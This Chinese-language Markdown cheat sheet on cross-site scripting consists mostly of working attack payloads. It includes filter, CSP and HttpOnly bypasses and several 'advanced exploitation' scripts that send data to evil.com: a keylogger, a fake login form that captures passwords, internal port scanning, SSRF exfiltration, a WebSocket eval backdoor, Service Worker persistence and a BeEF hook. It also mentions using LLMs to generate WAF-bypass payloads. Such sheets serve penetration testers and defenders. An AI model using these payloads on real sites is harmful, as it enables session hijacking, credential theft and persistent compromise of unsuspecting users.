# XSS (Cross-Site Scripting)

## 原理

攻击者将恶意 JavaScript 注入到网页中，在其他用户浏览器中执行，可窃取 Cookie、劫持会话、键盘记录、钓鱼、内网渗透、CSRF 防护绕过等。

## 分类

| 类型 | 特征 | 触发方式 |
|------|------|---------|
| 反射型 | payload 在 URL 中，服务器反射到响应 | 受害者点击恶意链接 |
| 存储型 | payload 存入数据库，每次访问都触发 | 受害者访问被污染页面 |
| DOM 型 | 纯前端 JS 处理用户输入导致 | 不经过服务器 |
| 突变型 (mXSS) | 浏览器解析 HTML 时发生突变 | 后端过滤被绕过 |

## 攻击链

### 1. 寻找注入点

- URL 参数、表单输入、HTTP 头（Referer、User-Agent、Cookie）
- 富文本编辑器、评论区、用户名、个人资料
- JSONP 回调、错误页面、搜索结果高亮

### 2. 测试基础 payload

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### 3. 判断上下文

```javascript
// HTML 上下文
<div>INPUT</div>          → <script>alert(1)</script>

// 属性上下文
<input value="INPUT">     → " onfocus=alert(1) autofocus="

// JavaScript 上下文
<script>var x = "INPUT";</script>  → ";alert(1);//

// URL 上下文
<a href="INPUT">          → javascript:alert(1)
```

### 4. 各上下文 payload

#### HTML 标签内

```html
<script>alert(1)</script>
<script src=//evil.com/x.js></script>
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<img src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<select onfocus=alert(1) autofocus></select>
<textarea onfocus=alert(1) autofocus></textarea>
<keygen onfocus=alert(1) autofocus>
<iframe src=javascript:alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<embed src=javascript:alert(1)>
<object data=javascript:alert(1)>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

#### 属性内

```html
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) x="
" onclick=alert(1) x="
' onfocus=alert(1) autofocus='
"><script>alert(1)</script><b x="
```

#### JavaScript 上下文

```javascript
";alert(1);//
'-alert(1)-'
";alert(1)//
</script><script>alert(1)</script>
`;alert(1);//
${alert(1)}
</script><svg onload=alert(1)>
```

#### URL 上下文

```html
javascript:alert(1)
javascript:alert`1`
javascript:/*--></title></style></textarea></script></xmp><svg/onload='/*` /*\`/*'/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 5. DOM XSS

```javascript
// 危险 sink
document.write(input)
element.innerHTML = input
element.outerHTML = input
eval(input)
setTimeout(input, 0)
setInterval(input, 0)
Function(input)()
location = input
location.href = input
location.assign(input)
location.replace(input)
element.setAttribute('onclick', input)
$('<div>').html(input)        // jQuery
$(input)                      // jQuery selector 注入

// source
location.hash
location.search
location.href
document.referrer
window.name
postMessage
localStorage / sessionStorage
```

#### 经典 DOM XSS

```javascript
// 漏洞代码
document.getElementById('content').innerHTML = location.hash.slice(1);

// 利用
http://target.com/#<img src=x onerror=alert(1)>
```

### 6. 存储型 XSS

- 找到能存入数据库的输入点（评论、用户名、个人简介）
- 提交 payload
- 访问展示页面触发

## 绕过技巧

### 标签过滤

```html
<!-- 大小写混合 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 嵌套 -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- 编码 -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- 不用 script 标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src=javascript:alert(1)>
```

### 关键字过滤

```javascript
// alert 过滤
window['ale'+'rt'](1)
window['al'+'ert'](1)
self['al'+'ert'](1)
top['al'+'ert'](1)
parent['al'+'ert'](1)
frames['al'+'ert'](1)
this['al'+'ert'](1)
eval('al'+'ert(1)')
eval(atob('YWxlcnQoMSk='))
Function('al'+'ert(1)')()
setTimeout('al'+'ert(1)',0)
window.onerror=alert;throw'1'

// document.cookie 过滤
document['coo'+'kie']
document['cookie']
self['doc'+'ument']['coo'+'kie']
```

### 括号过滤

```javascript
// 反引号
alert`1`
window.alert`1`

// throw
window.onerror=alert;throw'1'

// onerror
window.onerror=eval;throw'=alert\x281\x29'

// HTML 实体
<img src=x onerror=alert&#40;1&#41;>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
```

### 引号过滤

```javascript
// 反引号
alert`1`
String.fromCharCode(97,108,101,114,116,40,49,41)

// 正则
alert(/1/.source)
```

### 空格过滤

```html
<!-- / 代替 -->
<img/src=x/onerror=alert(1)>

<!-- Tab %09 -->
<img%09src=x%09onerror=alert(1)>

<!-- 换行 %0a -->
<img%0asrc=x%0aonerror=alert(1)>
```

### CSP 绕过

#### 1. 利用白名单域名

```html
<!-- 如果 CSP 允许 googleapis.com -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- 允许 cdn.jsdelivr.net -->
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.2/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

<!-- 允许 cdnjs -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.9/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

#### 2. base-uri 绕过

```html
<!-- CSP 没限制 base-uri -->
<base href="https://evil.com/">
<!-- 后续相对路径资源会从 evil.com 加载 -->
```

#### 3. JSONP 绕过

```html
<!-- 找一个允许的 JSONP 端点 -->
<script src="https://allowed-domain.com/api?callback=alert(1)//"></script>
```

#### 4. dangling markup

```html
<!-- 利用未闭合标签窃取后续内容 -->
<img src="https://evil.com/log?
<!-- 后续 HTML 会被当作图片 URL 发到 evil.com -->
```

#### 5. nonce 泄露

```html
<!-- 如果 nonce 能通过 DOM XSS 读取 -->
<script>
  fetch('https://evil.com/?nonce='+document.scripts[0].nonce)
</script>
```

#### 6. script-src 'unsafe-inline' + 'strict-dynamic'

```html
<!-- 如果 CSP 是 strict-dynamic，可通过已有脚本创建新脚本 -->
<script>
  var s = document.createElement('script');
  s.src = 'https://evil.com/x.js';
  document.head.appendChild(s);
</script>
```

#### 7. CDN Angular 绕过

```html
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.2/angular.min.js"></script>
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>
```

### HttpOnly 绕过

```javascript
// HttpOnly 防止 JS 读取 Cookie，但可以：
// 1. 利用 XSS 触发 CSRF（不需要 Cookie）
// 2. 利用 XSS 做中间人攻击（修改页面）
// 3. 利用 XSS 探测内网
// 4. 利用 XSS 读取 localStorage / sessionStorage 中的 token
// 5. 利用 XSS 调用 API（浏览器自动带 Cookie）

fetch('/api/user/info').then(r=>r.json()).then(d=>fetch('https://evil.com/?'+JSON.stringify(d)))
```

## 高级利用

### 1. 键盘记录

```javascript
document.onkeypress = function(e){
  fetch('https://evil.com/log?key='+e.key)
}
```

### 2. 钓鱼（伪造登录框）

```javascript
document.body.innerHTML = '<form action=https://evil.com/steal method=post>'+
  '<input name=username placeholder=用户名>'+
  '<input name=password type=password placeholder=密码>'+
  '<button>登录</button></form>'
```

### 3. 内网探测

```javascript
// 探测内网服务
async function scan(port){
  try{
    let r = await fetch('http://127.0.0.1:'+port+'/',{mode:'no-cors'})
    fetch('https://evil.com/?port='+port+'&status=open')
  }catch(e){
    fetch('https://evil.com/?port='+port+'&status=closed')
  }
}
[22,80,443,3306,6379,8080,9200].forEach(scan)
```

### 4. 利用 XSS 触发 SSRF

```javascript
// 浏览器作为 SSRF 代理
fetch('http://internal-service/api/admin')
  .then(r=>r.text())
  .then(t=>fetch('https://evil.com/?data='+btoa(t)))
```

### 5. WebSocket 持久化

```javascript
// 通过 WebSocket 保持持久连接
var ws = new WebSocket('wss://evil.com/ws')
ws.onmessage = function(e){
  try{ eval(e.data) }catch(err){ ws.send(err) }
}
```

### 6. Service Worker 持久化

```javascript
// 注册 Service Worker 实现持久化
navigator.serviceWorker.register('https://evil.com/sw.js',{
  scope: '/'
})
```

### 7. BeEF 框架

```html
<script src="http://attacker:3000/hook.js"></script>
```

## 2024-2026 新技术点

### 1. mXSS (突变型 XSS)

```html
<!-- 浏览器解析时发生突变 -->
<p>]</p><svg><style><a id="</style><img src=1 onerror=alert(1)>">
<!-- DOMPurify 2.x 之前版本可被绕过 -->

<!-- 新的 mXSS 向量（2024） -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

### 2. CSS 注入升级

```css
/* 利用 CSS 选择器逐字符窃取 */
input[value^="a"] { background: url(https://evil.com/?c=a) }
input[value^="b"] { background: url(https://evil.com/?c=b) }
/* ... */

/* CSS :has() 选择器（2023+ 浏览器支持） */
:has(input[value^="admin"]) { background: url(https://evil.com/?admin) }
```

### 3. Trusted Types 绕过

```javascript
// Trusted Types 要求 sink 接收 TrustedHTML
// 但可以通过以下方式绕过：
// 1. 找到 policy.default 的滥用
// 2. 利用 Angular/React 内部 sink
// 3. DOMParser 不受 Trusted Types 限制
const doc = new DOMParser().parseFromString(payload, 'text/html')
```

### 4. WebRTC 数据泄露

```javascript
// WebRTC 可泄露内网 IP（即使有代理）
RTCPeerConnection.createDataChannel('')
RTCPeerConnection.createOffer(o=>o.sdp.split('\n').forEach(l=>{
  if(l.startsWith('c=')||l.includes('raddr'))
    fetch('https://evil.com/?'+l)
}), e=>{})
```

### 5. importmap 滥用

```html
<!-- 通过 importmap 劫持模块 -->
<script type="importmap">
{
  "imports": {
    "react": "https://evil.com/react.js"
  }
}
</script>
<script type="module">
import React from 'react'  // 加载 evil.com 的代码
</script>
```

### 6. CSS @scope 绕过

```css
/* CSS @scope（2024+） */
@scope (.user-content) {
  :scope * { /* ... */ }
}
```

### 7. Web Components / Shadow DOM

```javascript
// Shadow DOM 内的 XSS 可能绕过外部 CSP
customElements.define('x-pwn', class extends HTMLElement {
  constructor(){
    super()
    const shadow = this.attachShadow({mode:'open'})
    shadow.innerHTML = '<img src=x onerror=alert(1)>'
  }
})
```

### 8. SVG XSS 新场景

```html
<!-- SVG 文件直接访问 -->
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>

<!-- SVG + foreignObject -->
<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>
```

### 9. PDF XSS

```html
<!-- PDF.js 漏洞利用 -->
<!-- 通过 FontFace API 触发 -->
<!-- CVE-2024-4367 (PDF.js) -->
```

### 10. AI 驱动的 XSS payload 生成

- 使用 LLM 根据特定 WAF 规则生成绕过 payload
- 自动 fuzz 测试各种编码组合

## 工具推荐

- **XSStrike** — 自动化 XSS 检测
- **Dalfox** — 现代 XSS 扫描器
- **BruteXSS** — 简单 XSS 扫描
- **XSSer** — XSS 自动化
- **BeEF** — 浏览器利用框架
- **DOM Invader** (Burp 插件) — DOM XSS 检测
- **csp-evaluator** — CSP 评估

## 参考链接

- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
